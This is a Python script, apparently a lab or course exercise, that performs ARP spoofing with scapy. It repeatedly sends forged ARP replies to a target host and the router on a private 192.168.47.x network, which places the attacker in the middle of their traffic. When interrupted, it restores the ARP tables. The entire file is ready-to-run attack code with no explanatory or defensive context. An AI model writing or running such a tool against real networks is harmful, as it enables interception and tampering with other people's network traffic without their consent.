import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


send_packets_count = 0
target_ip = "192.168.47.134"
router_ip = "192.168.47.2"
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        send_packets_count = send_packets_count + 2
        print(f"\r[+] Packets sends:{str(send_packets_count)}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detecting CTRL + C ......... Resetting ARP tables... Please wait.\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[+] Reset of ARP table complete.")
